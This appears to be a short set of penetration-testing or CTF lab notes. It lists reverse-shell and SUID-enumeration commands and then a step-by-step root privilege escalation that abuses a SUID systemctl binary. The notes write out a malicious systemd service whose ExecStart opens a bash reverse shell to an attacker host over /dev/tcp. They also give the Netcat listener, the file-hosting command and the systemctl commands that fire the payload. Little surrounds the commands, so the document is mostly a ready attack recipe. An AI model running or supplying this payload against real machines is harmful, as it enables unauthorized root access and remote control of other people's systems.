`cd /usr/share/webshells/php/php-reverse-shell.php` — Reverse shell script location 

`nc -lvnp 1234` — Start Netcat listener for the reverse shell connection

`find / -user root -perm -4000 -print 2&gt;/dev/null` — Find all SUID files owned by root

`/bin/systemctl` — SUID binary exploitable via GTFOBins commands

### **Privilege Escalation: SUID systemctl**

**Objective:** Gain root access by exploiting the SUID permission on the `systemctl` binary.

**1. Create Malicious Service (Attacker Machine)**

Create a file named `root.service` with the following configuration to spawn a reverse shell:

- **[Unit]:** Description=Root Shell
- **[Service]:**
    - `Type=simple`
    - `User=root` (Executes as root)
    - `ExecStart=/bin/bash -c 'bash -i &gt;& /dev/tcp/&lt;ATTACKER_IP&gt;/&lt;PORT&gt; 0&gt;&1'`
- **[Install]:** `WantedBy=multi-user.target`

**2. Transfer & Prepare**

- **Attacker:** Host the file (e.g., `python3 -m http.server`) and start a listener: `nc -lvnp &lt;PORT&gt;`
- **Target:** Download `root.service` to a writable directory (e.g., `/tmp`)

**3. Execute Exploit (Target Machine)**

Run the following commands using the vulnerable SUID binary:

1. `systemctl enable /tmp/root.service` (Registers the service)
2. `systemctl start root` (Executes the payload)

**Result:** The Netcat listener catches the connection, granting a shell with **root** privileges.
